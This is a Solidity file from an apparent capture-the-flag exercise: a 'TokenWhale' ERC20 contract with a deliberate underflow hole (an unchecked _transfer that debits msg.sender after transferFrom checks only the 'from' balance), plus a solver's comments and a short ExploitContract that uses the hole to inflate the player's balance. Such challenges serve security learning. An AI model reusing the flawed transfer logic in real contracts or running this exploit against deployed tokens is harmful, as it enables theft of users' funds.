// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {console2} from "forge-std/console2.sol";

contract TokenWhale {
    address player;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    string public name = "Simple ERC20 Token";
    string public symbol = "SET";
    uint8 public decimals = 18;

    event Transfer(address indexed from, address indexed to, uint256 value);

    constructor(address _player) {
        player = _player;
        totalSupply = 1000;
        balanceOf[player] = 1000;
    }

    function isComplete() public view returns (bool) {
        return balanceOf[player] >= 1000000;
    }

    function _transfer(address to, uint256 value) internal {
        unchecked {
            //i must make smart contract attacker call this
            //but how can I make the value greater than balanceOf(msg.sender)

            balanceOf[msg.sender] -= value;
            balanceOf[to] += value;
        }

        emit Transfer(msg.sender, to, value);
    }

    function transfer(address to, uint256 value) public {
        require(balanceOf[msg.sender] >= value);
        require(balanceOf[to] + value >= balanceOf[to]);

        _transfer(to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address spender, uint256 value) public {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
    }

    function transferFrom(address from, address to, uint256 value) public {
        //msg sender is attacker contract
        require(balanceOf[from] >= value);

        require(balanceOf[to] + value >= balanceOf[to]);

        require(allowance[from][msg.sender] >= value);

        allowance[from][msg.sender] -= value;
        _transfer(to, value);
    }
}

// Write your exploit contract below
contract ExploitContract {
    TokenWhale public tokenWhale;
    address player;

    constructor(TokenWhale _tokenWhale) {
        tokenWhale = _tokenWhale;
    }

    function setPlayer(address _player) public {
        player = _player;
    }

    function Exploit() public {
        tokenWhale.transferFrom(player, msg.sender, 501);
        tokenWhale.transfer(player, 1_000_000);
    }

    // write your exploit functions below
}
